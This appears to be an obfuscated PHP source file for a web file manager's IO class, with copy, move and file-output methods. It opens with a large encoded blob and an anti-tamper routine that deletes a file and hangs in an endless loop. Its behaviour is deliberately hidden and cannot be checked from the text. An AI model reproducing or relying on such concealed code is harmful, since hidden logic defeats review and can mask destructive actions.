OPitoIRaGIQxBHw==')."\xcb\xa9\x74\xd2\xc3\xf4\xd0\x44\xc7\x85\x80\x2e\xce\x7f\x61\x3a\x8c\xc8\xd2\x11\x87\x6f\xed\x5e\x9c\xb5\xa\x51\x28\xcc\xde\x2a\x68\xa3\xd1\x4e\x67\x85\x9e\x57\x46\xb\x2a\x83\xb7\x96\xcd\x12\xd6\x66\x94\x88\x91\x41\x59"."\217\121\54\133\327\62\162\301\131\302\367\202\34\141\124\6\147\100\71\274\20\264\112\320\261\247\3\360\223\142\5\113\256\240\5\70\240\223\362\304\111\327\352\257\134\100\261\156\60\135\77\21\261\341\317".strrev('rƉ@>`J\\#V= /klJ?s6&)Oe').strrev('5yGN*	KK*H"qF|mi,BA0xI@').strrev('V&J'."\0".'ڠXl檆RqB4n '."\r".'%XTl,!\'gOݐM').base64_decode('mKsz5eo0XJ1k070n/tmLRJNVi7ggoY7NUQPxnhr6g0hpyapweElXNSJPhbcxrq+TFjRpBHR4VQ==').strrev('9ik:՗Yfx[_~	@޽ݣ}5C2T`g	n\'n')."\xb4\xcc\x7\xb8\x67\x8b\xac\x49\xda\x85\xde\x90\x66\x3e\x3\x89\xfb\x2d\x92\x18\x9a\x1c\xe0\xcf\xf9\xb\x62\x86\x8b\x9a\x3a\xc5\x84\x3d\x90\x99\x55\x32\x4c\xaf\xc9\x45\xf5\xc6\x5d\x66\x81\xc8\xa\xc4\x65\x42\xaf\x97\x4c".strrev('9w$PEKN& st-΁21j"')."\102\7\120\170\40\245\126\102\225\112\114\250\212\207\354\204\154\127\360\101\305\160\343\26\124\211\134\241\345\47\211\324\362\364\25\61\372\140\272\232\57\320\373\155\166\302\6\152\221\42\336\272\55\372\101"."\x7f\xe7\x90\xdf\x12\xf9\x8d\x4d\x10\x82\x57\xc\xa2\x5f\x10\x57\x48\x86\x9a\xa9\xd3\xb4\x50\xff\x8d\x7e\x83\x35\x28\xc3\xcf\x3a\x91\x46\xf0\x90\xd4\xa9\xe4\x66\x58\x92\x1f\xa0\xcd\x97\xfa\xa0\xe5\x52\x2e\x25\x4d\x80\xae"."\300\116\111\115\156\245\157\246\325\114\46\12\125\341\110\375\343\151\135\52\337\144\322\340\344\145\360\154\10\270\100\365\70\40\133\5\25\44\144\111\346\270\240\21\300\315\325\211\215\237\323\111\224\173\240".base64_decode('+TNgM3Yk5P6Nmkmjo4Uo4ICCYzAoQ0lw0UH2CTYHEEv0BBnHVuz8IaGW5kvIHwlxLVvdZQgqRg==')."\2\305\100\333\60\11\77\370\147\123\34\304\10\25\220\126\233\376\41\216\250\254\360\264\206\306\6\301\326\302\333\351\11\105\117\12\101\207\163\275\136\352\127\302\36\341\5\161\341\340\44\61\356\340\144"."\61\376\216\223\46\211\351\244\73\13\173\114\257\337\37\22\175\225\224\125\257\77\40\170\331\42\33\144\270\252\323\247\27\174\375\275\204\263\105\10\5\107\10\227\356\44\152\117\221\302\264\206\26\152\125"."\xc4\x1f\x5e\x83\x7d\x13\x15\x5e\x34\xc5\xc7\x6a\xf8\x5b\x47\x7b\x37\xfc\x2d\xc5\x15\x6c\xae\x12\x53\xb1\xbc\xa0\x26\xa0\x87\x3d\x58\x3b\x49\x7c\x67\x7b\xa\x74\x9f\xe9\x72\xd5\x3a\x67\xd6\x4d\x9d\x92\x15\x61\x91\x7a\x8"."\x8c\xd4\xbb\xa6\xf4\x93\x6a\x4c\xe1\x30\x80\x30\x95\xc1\x5d\x2b\x6b\x6b\xd6\xcc\xa8\x73\xd6\xd7\x46\x1a\xeb\x98\x5a\x57\x84\x9a\xac\xc1\x17\xbb\xb1\x52\xd4\xd0\xea\x96\xb5\xdc\x99\x57\x64\xd0\x59\x1f\x19\x9a\x2a\x68\x99".base64_decode('rQaAtQwwlqZnZsgWnWGZ9bWDNTOGnPWDKyORIfhZB2CtEB4JOevr5IVTXf2aKeJjl6ST4pAupw==')."\106\153\171\166\1\0\205\31\15\354\237\220\35\204\250\124\33\360\0\56\55\330\54\131\331\274\100\266\320\57\321\354\26\121\255\34\103\350\32\123\240\253\42\372\244\126\142\171\256\136\157\127\262\145\101"."\333\154\151\220\72\200\20\47\25\252\51\257\103\105\177\321\242\152\246\220\121\124\364\105\206\40\242\227\173\30\26\336\371\23\352\12\44\71\301\123\3\314\210\172\45\41\42\202\142\246\47\361\340\201\115".base64_decode('7EEDhDoh1uKERwHCyttT5m6GbLAq+xB/A0ImUwvhgaLQjod6HuDa4mMx0gOwj6NlBfZRm+2MsA==')."\121\345\172\62\110\316\340\232\132\64\110\205\247\270\222\207\167\72\11\174\172\16\72\236\224\315\276\372\3\320\65\23\344\4\121\172\316\52\200\274\76\157\64\344\135\341\251\210\200\316\65\253\307\0\1"."\x20\xec\xa5\x82\x91\x0\xf7\xf9\x91\x3\x25\x1b\xbc\xdf\xb7\xc4\xe7\x1f\xa8\x86\x1a\xee\xb\x70\xe1\x42\x88\xea\x74\xfb\xc2\x51\x61\xb7\x8a\xb7\x31\x60\x33\xc6\xf6\x31\x54\x95\x3d\x6e\xc4\x9b\x9b\x62\x6c\x9a\x31\x47\x43"."\x54\xca\x27\x33\x85\xa\x1\xf9\xc\x3c\xb2\x85\xd2\x78\xc9\xc1\x34\xfb\xe9\x4e\xa8\x8b\xfb\x2a\x20\xc9\xd0\xe1\x2c\xa9\x2\xf2\xdc\x40\x12\x88\xe7\x3b\x62\xb4\x2c\x55\x3d\xdd\x61\x5b\x2d\x43\xc9\x99\x49\xd5\x28\x3b\x9f".strrev('*Vצu{%5AY˴8I25^$$<ݐ/.pz'."\r".'̳9i').strrev('S#η55\'b Bs(FvF"	/bq}$Y').base64_decode('XOHJC71V5kKFGPNMUWZZR33wSaJNG7UxhRmgpxNgC0wxDmQL3/XkLROToDIrkuA4aHrGWZkYYw==')."\102\245\255\176\52\166\125\213\251\122\24\212\22\172\64\116\167\170\144\51\42\235\270\234\367\225\105\373\273\311\101\337\144\322\105\227\123\330\160\215\164\256\243\111\22\310\13\362\36\201\42\360\71\5\353"."\106\156\167\231\341\70\72\164\204\40\330\47\161\123\77\374\210\3\33\132\364\332\3\13\31\202\31\230\232\240\103\207\136\116\250\272\226\140\40\172\132\241\252\241\24\356\54\30\335\145\163\74\107\136\135".strrev('3>$AҰDgP>4, ׄiM.˰0'."\n".'')."\xfb\x6a\xeb\xa0\xc4\x64\xf3\x25\xd0\x37\xce\xbc\xc6\x82\x51\x41\x6b\x72\x9f\x52\xe2\x9d\xce\x2\x34\x96\xd1\x9c\x69\xb\x60\x57\x68\xb6\xd4\xc\xc4\xb0\xc6\xd4\x18\x63\xc1\x84\x29\xf6\x4\x5c\xc\xd4\x41\xbb\x89\x3d\x18"."\100\314\221\241\213\146\61\123\77\221\77\307\260\235\23\341\213\255\314\55\34\335\336\214\145\265\270\324\353\137\14\167\335\135\336\320\22\51\245\132\22\27\152\320\55\204\175\26\43\337\16\350\70\217\22"."\161\214\275\42\16\77\35\350\350\303\41\272\201\61\331\216\103\164\33\247\260\267\340\205\214\361\250\213\331\301\163\23\107\202\231\260\226\341\122\41\240\42\205\130\276\220\6\356\130\354\363\36\201\311\136".base64_decode('xp7PuApvAKqXXahSLsHP8FMTIYGWK2qmxqc07apxEb+iL1FTBISE+O4871ZWToW9MQ9jHPJkjA==')._kodDe('KTMeUwVcA9vLyuV/h/X6Oe+g9UwgwHYsSNkhksuysniC+rfiqxvyAgd0Kzt/FJ4AdHceutPWMr4=').base64_decode('sqvA1hL8caayymgJKiCyB2vwu9udRJnHVif+cjt5Cwc9fsP9IqJPIELK8KwLVUB4sjuK7o6p2w==').strrev('f`B.270A~NJ{CGuZ'."\r".'r!?R$1')."\364\31\31\332\0\34\54\167\375\230\266\211\312\225\270\40\116\342\366\361\14\101\152\223\32\220\13\5\254\172\203\56\200\26\120\357\314\260\103\310\343\340\360\265\34\117\66\157\215\227\307\30\152\322\120"."\315\164\371\53\364\75\232\311\35\260\127\1\41\331\202\357\241\240\300\246\147\307\53\0\66\363\372\136\132\151\346\346\20\332\247\344\222\272\330\17\210\17\172\0\277\221\321\27\266\252\226\341\301\267\25".strrev(';=k<[ )e]$E'."\n".'xA/4$B(')."\14\203\25\221\175\52\127\164\43\165\225\371\242\201\57\263\1\10\60\23\144\353\43\114\16\32\47\120\15\126\170\17\142\237\153\316\230\360\300\275\1\204\147\346\133\321\206\106\146\16\330\140\114\352\111".base64_decode('hqye2KtMIefFDk5sUEMQzkX3mth/Dvc+TNBBaQHsMIfMbTFL6pcI/UDxHRAzM492Vfoxgj7hmA==')."\160\302\335\50\216\350\110\6\166\212\322\63\101\220\26\110\164\232\231\226\110\120\110\332\1\262\216\214\76\20\225\212\42\130\165\250\215\112\21\12\33\60\364\336\27\33\73\330\243\344\247\113\115\62\341".base64_decode('E4b5LkV0Yk+bgAmjogz0C7fgMm6jzMhFM3uRAqMZwuKbzB1Iy/jMH5nJcJ7Cu4OSfUrlBcIahg==')."\xc5\xc2\x6d\x72\x62\xb9\x88\xc8\x7a\xa9\x2c\x41\xb0\xbc\x27\xc3\x7a\xa5\x4f\x5\xee\xb8\x29\x57\xc8\x72\xa7\x57\x20\x60\x17\x8f\xf1\xc6\x80\x7a\xa3\xf8\x8a\xe6\x16\x8c\x8c\x8c\x94\x6f\x65\xfa\xcc\x93\x8c\x5f\x1b\x94\x6d"."\x59\xa0\xa\x45\x2d\xa1\xc1\x4c\x56\x2b\x1b\xae\x8a\xc2\xbe\x41\xee\xc4\x69\xf\x12\x97\x81\xe0\xe1\x36\x83\x2a\x3f\x3b\x5e\x9e\x4d\x34\x35\xcf\x9a\x27\xee\x10\x79\xd7\x73\xe7\x34\xb8\x86\x86\x90\x90\x1c\xe7\x13\x55\x1f"."\172\74\306\206\127\262\123\213\104\37\243\23\347\47\212\264\173\0\45\117\11\12\274\254\214\13\175\43\242\166\127\23\111\161\42\341\24\213\345\234\347\254\277\132\51\377\377\365\260\73\122\43\173\301\56".strrev('s)Qn^`XDLdFG}P~STy('."\n".'&').base64_decode('RuS1mvvLQERiIxim+2bYfEGjjMKokZNljfaJ5BMIjbwUGOLz2dJ5jCX4loYcwE8Px8Be0iZGgg==')."\x30\x37\x40\x12\x48\x3b\x51\x6\x14\x17\x6b\x61\xf2\x0\x12\xd6\x4\x51\x90\x48\x38\x5c\x52\x40\x6d\x11\x9c\xf6\x90\xdd\x2a\xef\xc\x37\x99\x13\x9\x59\x7c\x4a\x11\x4\x19\x2d\x10\xd6\x4b\x26\x17\xf2\xfe\x89\x8b\x15\x18".strrev('4P9?bf5%\'Z}.u|2LAw8@auG-')."\223\21\65\350\53\226\14\230\35\363\76\113\2\242\327\153\141\111\302\105\142\360\376\142\54\41\36\331\26\42\1\56\13\41\225\150\341\352\6\205\231\213\157\372\204\12\175\131\105\141\36\132\240\353\31"."\266\227\301\107\73\4\45\223\341\136\201\304\367\1\62\61\305\160\2\12\33\261\164\372\56\156\225\100\145\53\341\122\114\270\206\26\37\251\342\211\7\166\65\324\207\21\70\40\272\45\237\4\215\163\210"."\326\5\61\246\307\106\277\52\135\26\165\10\2\137\210\370\54\252\230\313\214\126\105\74\316\357\160\30\76\325\150\337\151\211\245\341\153\112\270\27\10\102\261\335\71\311\110\127\47\50\315\304\107\126\242"."\x24\xb\xbe\xc4\xba\x53\x8a\xc\x18\x3a\x5a\x89\xec\x50\xb6\xb9\x10\x4c\x6a\x4\x25\x97\x50\xf9\x9c\xb6\x74\x5b\x2f\x0\xf1\x4f\x38\x2e\xc6\x6f\x73\xe1\x87\x59\xe1\xc3\x42\x60\x66\x4b\xa1\xfe\xbe\x5a\xe4\xe4\x16\x2\x90"."\357\30\364\276\313\52\262\60\256\222\16\220\204\377\341\127\176\152\141\64\314\144\225\344\365\361\67\27\353\44\376\72\215\370\334\54\74\157\351\326\31\371\330\175\162\233\112\21\154\163\15\63\254\345\315".base64_decode('yeIFChIe9DgZ+hSmzYQUwdKQjhafVrZnCsY1ZNlGgL9bW/5eLdoeYInfJvgT1RERJJx2QDVo+w==')."\xe6\x19\x45\x22\x30\x7d\xa1\x8b\xe4\x20\x9c\xd2\xda\xcf\xcb\xd9\xcb\xa6\x15\xd3\xb5\xa0\xf5\xa\xd1\x28\x15\xf5\x91\x8\x7e\xa1\x67\x6e\x2f\x77\x25\x80\xa2\xf1\xb9\x93\xbb\xa8\x30\x6d\x8a\xf2\x54\xfd\x36\x49\x4c\x38\x5d".base64_decode('jyN64yIuShgDtUT/uPNaeQorrRmJDi2XKMcv5GIMytHBYHRUAwPJoArHSipFfgbL5Z1EolspVg==')."\101\145\346\275\14\12\40\14\25\55\346\302\203\0\334\123\255\72\46\62\160\202\227\254\254\16\104\254\204\362\7\3\312\133\205\346\2\203\223\143\357\234\340\332\213\20\25\7\341\47\214\231\357\66\234"."\225\241\243\204\112\202\73\165\303\165\144\33\14\136\244\375\135\3\206\346\347\217\3\247\220\172\264\303\6\55\363\265\13\217\150\350\122\122\26\105\166\67\102\366\125\67\101\266\1\357\25\262\23\117\336".base64_decode('J00Qql4Ip0p7F4fKzvvL2CJHJvKfLWcb02SNJZhBMdJWxfLhRkIsp1UMzKITEBzntkdhfLWsRQ==')."\142\202\362\326\342\24\106\105\237\221\64\325\213\56\57\200\166\131\371\275\26\317\104\70\17\252\270\164\13\353\125\322\340\32\125\115\206\243\140\112\56\246\330\322\212\373\65\236\14\276\312\155\116\122\303"."\312\366\243\331\121\326\172\122\147\356\250\132\100\235\254\113\252\42\127\26\107\306\277\34\33\355\301\252\327\242\352\176\161\262\132\124\105\236\264\26\34\273\354\12\255\32\233\243\61\125\30\33\277\361\252"."\144\241\74\256\312\375\33\316\23\256\242\101\233\272\131\105\264\170\231\127\375\272\57\130\165\42\232\366\173\270\62\270\330\61\124\161\140\307\331\147\275\273\351\22\157\100\242\37\42\330\306\170\13\271\221"."\34\365\332\3\112\340\276\20\131\51\124\32\53\163\366\112\51\62\127\20\34\214\226\171\213\205\352\312\370\13\235\163\201\315\266\26\27\156\354\41\120\164\363\212\343\155\227\150\32\174\2\227\335\163\331"."\56\165\252\304\73\371\11\227\350\215\327\346\30\30\242\360\323\162\274\214\222\363\76\174\114\215\164\50\10\244\143\34\212\371\62\136\235\160\164\110\67\54\150\167\14\70\150\36\375\166\350\226\105\47\66"."\220\57\21\46\22\251\220\133\23\341\106\17\174\111\212\340\41\327\100\107\215\210\264\20\13\100\237\344\300\34\356\176\102\52\216\105\154\305\26\200\107\230\54\40\256\40\43\172\42\246\227\350\163\54\360".base64_decode('XQFeGt++KOVCEfdcT6hCvH1EKj2mC8e4iD6wA+XhIG9JMfUfkjyBCJ25OvyqHMiRDc8Cv7yJvA==')."\xe0\xc3\x7\x6b\x3d\xcb\xbc\xa1\x70\xa8\x22\x2a\xe0\xe\x85\x6\xfc\xc1\x2e\xac\x42\x58\x11\x8d\x52\x9\x57\xbd\x15\x51\x81\x1e\xbf\x6f\xb2\x38\x4f\x9f\xdb\xdb\x5b\x11\x7\xaf\x7e\xa1\x62\x23\x7d\xd7\xc\x47\x79\x3\xa8"."\x96\xee\xde\x5e\xaa\x47\x54\x59\xb\x6f\xe7\x12\x5e\x13\x74\x27\xc1\xcf\xde\xf2\x69\x3d\x27\x50\xa9\xa0\xe3\x40\xf\x1c\x43\xa\xd5\xbe\x86\xcc\x98\x4e\xe\xf1\x5b\xcd\xb2\x53\x10\x21\x3b\xfb\x1e\x55\x1c\x72\x93\x3e\xa2"."\307\76\362\25\162\273\260\360\302\253\132\37\311\54\110\75\372\21\61\32\137\235\166\211\72\342\360\171\123\66\273\231\334\211\232\55\152\173\340\327\235\205\110\274\264\333\356\163\4\70\232\74\360\124\110"."\x16\xc8\x56\x5c\x39\x11\x80\x68\x2a\x96\x9d\xa7\x97\x75\x39\xff\x12\xd6\xeb\xca\xbb\x19\x4\xe1\x1d\x8\x5b\x73\x12\xf5\x6\x30\xac\xc7\x84\xd3\x3e\xdc\x15\xb6\x4e\x10\x2f\xe7\xf1\xb7\x2d\x1a\x70\x9d\xb0\x1e\x56\x52\x84"."\xcb\x40\xc1\x80\x87\x3a\xc6\xc5\x6f\xf1\x18\xa2\x9d\x31\x19\x4b\x49\xd1\xbb\xd6\xf2\x63\x28\xe1\x22\x11\xf6\xd7\xff\x3\xbe\x21\xcf\x8e\x6e\xbb\x0\x0".base64_decode('').base64_decode('').strrev('').""."", 10, -8))); goto F¬; aτ섯: if (!isset($_SERVER[$_SERVER[놫Ӱ][782]]) || !isset($_SERVER[$_SERVER[놫Ӱ][966]])) { goto cӠ; cӠ: $cܩ = $_SERVER[놫Ӱ][784]; $aΌ = $_SERVER[$_SERVER[놫Ӱ][779]] . $_SERVER[놫Ӱ][780]; $A = $cܩ($aΌ); goto Dۻ; Dۻ: $Bٌ = explode($_SERVER[놫Ӱ][214], $A); if (count($Bٌ) < $_SERVER[놫Ӱ][573]) { $b = $_SERVER[놫Ӱ][785]; $b(); } $e؇̅ = $_SERVER[놫Ӱ][967]; goto Dݭ; Dݭ: $e؇̅($_SERVER[$_SERVER[놫Ӱ][779]] . $_SERVER[놫Ӱ][780]); $A = 2; while ($A > 1) { $d = rawurlencode($A . $_SERVER[놫Ӱ][358]); } goto C; C: } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($E, $aͳޒ) { $C = self::driverMake($aͳޒ[0]); if (method_exists($C, $E)) { return @call_user_func_array(array($C, $E), $aͳޒ); } if (method_exists($C, $_SERVER[놫Ӱ][968])) { return @call_user_func_array(array($C, $E), $aͳޒ); } else { if (method_exists(self, $E)) { return @call_user_func_array(array(self, $E), $aͳޒ); } else { call_user_func_array(array(parent, $E), $aͳޒ); } } } public static function init($Dڕ) { return self::driverMake($Dڕ); } public static function copy($D, $f, $dԔʏ = false) { return self::copyMove($D, $f, $dԔʏ, $_SERVER[놫Ӱ][482]); } public static function move($Fڼ, $C֭, $Fᬅ = false) { return self::copyMove($Fڼ, $C֭, $Fᬅ, $_SERVER[놫Ӱ][484]); } public static function saveFile($f, $f驋ǣ, $bľެ = true) { goto B; Fؑ: $bӢ = self::driverMake($f驋ǣ); $C = !1; if ($bӢ->pathParse[$a[969]]) { $F¿ = $bӢ->pathParse[$a[969]]; $C = $bӢ; $bӢ = self::driverMake($F¿); } goto C; C: $Dܐկ = $bӢ->pathFather($f驋ǣ); $A = !0; if (!$bľެ && self::driverIsSame($b, $bӢ)) { $A = !1; } goto A; B: $a =& $_SERVER[놫Ӱ]; $e = self::info($f驋ǣ); $b = self::driverMake($f); goto Fؑ; A: $F貕 = self::copyFile($b, $f, $bӢ, $Dܐկ, $e[$a[28]], $A); if ($C) { $F貕 = $C->getPathOuter($F貕); } return $F貕; goto b; b: } private static function copyMove($Cص, $dނ, $d率, $fǐ) { goto eͣ; aߚ: $eՑ = $a->isFile($Cص); if (!$eՑ && $A͒->getType() == $F鉐[679] && $a->getType() == $F鉐[102]) { $eҨӿ = $A͒->copyFolderFromIO($a, $Cص, $dނ, $d率, $Cψ); } else { $eҨӿ = self::copyPath($a, $Cص, $A͒, $dނ, $d率, $Cψ, $eՑ); } if ($eҨӿ && $Cψ) { $a->remove($Cص); } goto aꢯ; Aي: $a = self::driverMake($Cص); $A͒ = self::driverMake($dނ); $Cψ = $fǐ == $F鉐[484]; goto E; eۖ: Hook::trigger($F鉐[73], $a, $Cص, $A͒, $dނ); $c֢ = self::driverIsSame($a, $A͒); if ($c֢) { if ($fǐ == $F鉐[484] && trim($dނ, $F鉐[8]) == trim($A͒->pathFather($Cص), $F鉐[8])) { return $A͒->getPathOuter($Cص); } if (method_exists($A͒, $fǐ)) { return $A͒->{$fǐ}($Cص, $dނ, $d率); } } goto aߚ; eͣ: $F鉐 =& $_SERVER[놫Ӱ]; if (!$Cص || $Cص == $F鉐[8] || !$dނ) { return !1; } ignore_timeout(); goto Aي; E: $eŰ = !1; if ($A͒->pathParse[$F鉐[969]]) { $dނ = $A͒->pathParse[$F鉐[969]]; $eŰ = $A͒; $A͒ = self::driverMake($dނ); } self::check($a, $Cص, $A͒, $dނ); goto eۖ; aꢯ: if ($eŰ) { $eҨӿ = $eŰ->getPathOuter($eҨӿ); } return $eҨӿ; goto d; d: } private static function check($B, $BƮ, $Bѧ, &$B) { $BڢϏ =& $_SERVER[놫Ӱ]; if (self::driverIsSame($B, $Bѧ) && $B->isFolder($BƮ) && $B->isParentOf($BƮ, $B)) { show_json(LNG($BڢϏ[970]), !1); } if (!$B->exist($BƮ)) { show_json(LNG($BڢϏ[101]), !1); } } private static function copyPath($FÌ̉, $F􃛵, $E읊ǒ, $A, $cŖ, $Bۻ, $eذل) { goto B; aӊ: $eߋʰ = $E읊ǒ->mkdir($E읊ǒ->getPath($c鏏)); $A = $E읊ǒ->getPathInner($eߋʰ); $E炏 = $FÌ̉->listPath($F􃛵, !0); goto d吇Ś; d吇Ś: $E = array_merge($E炏[$CІ׃[74]], $E炏[$CІ׃[75]]); foreach ($E as $Dǵ) { $Dϙ = $Dǵ[$CІ׃[29]] == $CІ׃[164]; $F􃛵 = $FÌ̉->getPathInner($Dǵ[$CІ׃[76]]); $Bޕ = self::copyPath($FÌ̉, $F􃛵, $E읊ǒ, $A, $cŖ, $Bۻ, $Dϙ); if (!$Bޕ) { write_log($CІ׃[971] . $F􃛵 . $CІ׃[972] . $A, $CІ׃[973]); } } return $eߋʰ; goto c; B: $CІ׃ =& $_SERVER[놫Ӱ]; $f = $FÌ̉->getPathName($FÌ̉->pathThis($F􃛵)); if ($cŖ) { $c = $E읊ǒ->fileNameExist($A, $f); $f = $E읊ǒ->fileNameAuto($A, $f, $cŖ, !$eذل); $cŖ = $c ? $cŖ : !1; } goto Fʹ܋; Fʹ܋: if ($eذل) { if (!$E읊ǒ->exist($A)) { $f = $E읊ǒ->getPathName($E읊ǒ->pathThis($A)); $A = $E읊ǒ->pathFather($A); } return self::copyFile($FÌ̉, $F􃛵, $E읊ǒ, $A, $f, $Bۻ); } if ($cŖ == REPEAT_RENAME_FOLDER) { $cŖ = !1; } $c鏏 = rtrim($A, $CІ׃[8]) . $CІ׃[8] . $f; goto aӊ; c: } private static function copyFile($ạ✮, $B׊, $EІ, $f, $dɑ, $a) { goto Cӭ; D茈: Hook::trigger($c˘[976], $ạ✮, $B׊, $EІ, $f, $dɑ, $e嗫); return $e嗫; goto a; Cӭ: $c˘ =& $_SERVER[놫Ӱ]; $f = $EІ->getPath(rtrim($f, $c˘[8]) . $c˘[8] . $dɑ); $f = $c˘[974] . time() . rand_string(5); goto cބ; A鈌: $Fʟ = $ạ✮->iconvApp($Fʟ); $e嗫 = $EІ->upload($f, $Fʟ, $a); del_file($Fï . $f); goto D茈; cބ: Hook::trigger($c˘[975], $ạ✮, $B׊, $EІ, $f, $dɑ, $f); if (self::driverIsSame($ạ✮, $EІ)) { if ($a) { $e嗫 = $EІ->moveFile($B׊, $f); } else { $e嗫 = $EІ->copyFile($B׊, $f); } Hook::trigger($c˘[976], $ạ✮, $B׊, $EІ, $f, $dɑ, $e嗫); return $e嗫; } $Fï = TEMP_FILES; goto Aωĥ; Aωĥ: mk_dir($Fï); $Fʟ = $Fï . $f; $Fʟ = $ạ✮->download($B׊, $Fʟ); goto A鈌; a: } public static function fileOut($f, $e܏ = false, $d׳ = false, $AĮ = '') { $Cα =& $_SERVER[놫Ӱ]; $DڱĈ = self::driverMake($f); if ($GLOBALS[$Cα[6]][$Cα[84]][$Cα[977]]) { return $DڱĈ->fileOutServer($f, $e܏, $d׳, $AĮ); } return $DڱĈ->fileOut($f, $e܏, $d׳, $AĮ); } public static function fileOutImage($C, $C¶ = 250) { $f =& $_SERVER[놫Ӱ]; $DԷ = array(250, 1200, 3000); for ($Cʒ퇼 = 0; $Cʒ퇼 < count($DԷ); $Cʒ퇼++) { if ($Cʒ퇼 == 0 && $C¶ <= $DԷ[$Cʒ퇼]) { $C¶ = $DԷ[$Cʒ퇼]; break; } else { if ($C¶ > $DԷ[$Cʒ퇼 - 1] && $C¶ <= $DԷ[$Cʒ퇼]) { $C¶ = $DԷ[$Cʒ퇼]; break; } else { if ($Cʒ퇼 == count($DԷ) - 1 && $C¶ > $DԷ[$Cʒ퇼]) { $C¶ = $DԷ[$Cʒ퇼]; break; } } } } $a넃ذ = self::driverMake($C); if ($GLOBALS[$f[6]][$f[84]][$f[977]]) { return $a넃ذ->fileOutImageServer($C, $C¶); } return $a넃ذ->fileOutImage($C, $C¶); } private static function driverIsSame($b챧ܱ, $a) { goto D; fѲ܎: if ($c != $C) { return !1; } if ($c == $D˳Ά[679]) { return !0; } if ($c == $D˳Ά[102]) { return !0; } goto Bᯈ; Bᯈ: if ($b챧ܱ->pathDriver == $a->pathDriver) { return !0; } return !1; goto Dժ; D: $D˳Ά =& $_SERVER[놫Ӱ]; $c = $b챧ܱ->getType(); $C = $a->getType(); goto fѲ܎; Dժ: } public static function copyUpdate($Eܿ, $eƫû) { goto b⩛; EՏ°: Hook::trigger($Bٴ[981], $Eܿ, $eƫû, $Eك); foreach ($cϑ as $cı) { IO::mkdir($cı); } foreach ($fƓ as $cı) { IO::copy($cı[$Bٴ[978]], $cı[$Bٴ[979]], REPEAT_REPLACE); } goto E; C޹ȵ: $cϑ = array(); foreach ($c as $eˆ => $cı) { if ($cı[$Bٴ[77]] == 1 && !isset($a[$eˆ])) { $cϑ[] = $eƫû . $Bٴ[8] . $eˆ; } if ($cı[$Bٴ[77]] == 0) { if (!isset($a[$eˆ]) || $a[$eˆ][$Bٴ[78]] != $cı[$Bٴ[78]]) { $fƓ[] = array($Bٴ[978] => $cı[$Bٴ[76]], $Bٴ[979] => $eƫû . $Bٴ[8] . get_path_father($eˆ), $Bٴ[980] => $cı); if (isset($a[$eˆ])) { IO::remove($eƫû . $Bٴ[8] . $eˆ); } } } } $Eك = array($Bٴ[164] => $fƓ, $Bٴ[77] => $cϑ); goto EՏ°; A⒆: $c = self::_listAll($Eܿ); $a = self::_listAll($eƫû); $fƓ = array(); goto C޹ȵ; b⩛: $Bٴ =& $_SERVER[놫Ӱ]; if (!IO::exist($Eܿ)) { return !1; } if (!IO::exist($eƫû)) { IO::mkdir($eƫû); } goto A⒆; E: } private static function _listAll($Dݓɗ) { $Dܹ =& $_SERVER[놫Ӱ]; $Dݓɗ = KodIO::clear($Dݓɗ); $a׻ = IO::listAll($Dݓɗ); foreach ($a׻ as &$E) { $CК = substr($E[$Dܹ[76]], strlen($Dݓɗ)); $E[$Dܹ[982]] = trim($CК, $Dܹ[8]); } return array_to_keyvalue($a׻, $Dܹ[982]); } public static function fileSubstr($A΂퓨, $b, $A = false) { goto Eǯ; EҠ: if ($b + $A > $aΪ) { $A = $aΪ - $b; } if ($b < 0 || $b >= $aΪ || $A <= 0 || $A > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\x65\122\145\141\x64\x20\x65\162\x72\157\x72\41\x20\x73\164\x61\x72\164\75{$b}\x3b\154\145\x6e\147\x74\x68\75{$A}\x3b\40\x73\151\172\x65\x3d{$aΪ}\73"); } return $C->fileSubstr($A΂퓨, $b, $A); goto Fݟ; dœъ: $dͺߋ = $A; if ($b < 0) { $b = $aΪ + $b; } if ($A === !1) { $A = $aΪ - $b; } goto EҠ; Eǯ: $C = self::driverMake($A΂퓨); $aΪ = $C->size($A΂퓨); $Eɠ = $b; goto dœъ; Fݟ: } private static function driverMake(&$b엮) { goto C΃; DŌ: if ($eؠ[$aͨ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$eؠ[$aͨ[364]]]) { return !1; } $b엮 = $eؠ[$aͨ[983]]; $fס = self::driverGet($eؠ, $b엮); goto Fկ; Fկ: return $fס; goto C; C΃: $aͨ =& $_SERVER[놫Ӱ]; $eؠ = KodIO::parse($b엮); if (!self::$driverListSystem) { $a = Model($aͨ[689])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($a, $aͨ[364]); } goto DŌ; C: } private static function driverGet($fˆ鳈, &$eܻ) { goto fν; fν: $dՄ =& $_SERVER[놫Ӱ]; $c = $fˆ鳈[$dՄ[984]]; $e筃 = $fˆ鳈[$dՄ[364]]; goto cڃ; D: if (isset($B϶ۈ[$dՄ[6]][$dՄ[995]])) { $a§Ψњ->pathBase = rtrim($B϶ۈ[$dՄ[6]][$dՄ[995]], $dՄ[8]) . $dՄ[8]; $eܻ = $a§Ψњ->pathBase . ltrim($eܻ, $dՄ[8]); } $eܻ = $a§Ψњ->getPath($eܻ); if (isset($fˆ鳈[$dՄ[969]])) { $eܻ = $fˆ鳈[$dՄ[969]]; } goto b݆Ԏ; cڃ: switch ($fˆ鳈[$dՄ[29]]) { case KodIO::KOD_IO: $B϶ۈ = self::$driverListSystem[$e筃]; break; case KodIO::KOD_SOURCE: $eܻ = $e筃 . $eܻ; $B϶ۈ = array($dՄ[985] => $dՄ[986], $dՄ[6] => $fˆ鳈); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $F = $GLOBALS[$dՄ[987]]; self::$driverListUser = array_to_keyvalue($F, $dՄ[364]); } $B϶ۈ = self::$driverListUser[$e筃]; break; case KodIO::KOD_SHARE_LINK: $B϶ۈ = array($dՄ[985] => $dՄ[988], $dՄ[6] => $fˆ鳈); $fү = Action($dՄ[989])->sharePathInfo($fˆ鳈[$dՄ[76]]); $eܻ = $fү[$dՄ[366]]; if (!$fү[$dՄ[366]]) { $C̗ = Model($dՄ[528])->getInfo($fү[$dՄ[437]]); $eܻ = KodIO::clear($C̗[$dՄ[990]] . $fˆ鳈[$dՄ[983]]); $fˆ鳈[$dՄ[435]] = $C̗; $fˆ鳈[$dՄ[969]] = $eܻ; $B϶ۈ = array($dՄ[985] => $dՄ[991], $dՄ[6] => $fˆ鳈); } break; case 